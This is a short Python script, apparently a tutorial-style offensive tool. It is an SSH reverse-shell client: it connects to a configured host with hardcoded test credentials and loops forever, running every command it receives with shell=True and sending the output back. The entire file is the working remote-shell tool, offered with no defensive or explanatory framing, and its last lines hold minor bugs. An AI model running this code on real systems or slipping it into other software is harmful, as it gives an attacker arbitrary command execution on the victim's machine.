import paramiko
import threading
import subprocess

HOST = '127.0.0.1'
USERNAME = 'test'
PASSWORD = 'test'
PORT = 22

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
chan = client.get_transport().open_session()
chan.send('Shell time!')
while True:
    command = chan.recv(1024)
    try:
        CMD = subprocess.check_output(str(command).strip('b\'\''), shell=True)
        chan.send(CMD)
    except Exception as e:
        chan.send(str(e))
print (chan.recv(1024))
client.close